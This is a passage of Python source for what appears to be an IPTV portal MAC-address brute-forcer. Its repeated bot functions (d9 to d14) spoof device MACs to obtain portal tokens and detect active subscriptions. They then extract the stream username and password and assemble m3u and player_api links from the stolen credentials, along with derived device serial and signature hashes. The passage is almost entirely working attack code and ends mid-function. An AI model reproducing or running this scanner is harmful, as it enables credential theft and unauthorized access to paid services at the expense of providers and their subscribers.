			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d9():
	global hitc
	global hitr
	global tokenr
	for mac in range(9,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_09"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d10():
	global hitc
	global hitr
	global tokenr
	for mac in range(10,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_10"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d11():
	global hitc
	global hitr
	global tokenr
	for mac in range(11,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_11"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d12():
	global hitc
	global hitr
	global tokenr
	for mac in range(12,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_12"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d13():
	global hitc
	global hitr
	global tokenr
	for mac in range(13,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_13"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="❓Data not available ℹ "
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' 🖤 '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' 🎞 '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' 🖥 '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d14():
	global hitc
	global hitr
	global tokenr
	for mac in range(14,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_14"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="❌Invalid 🔴"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
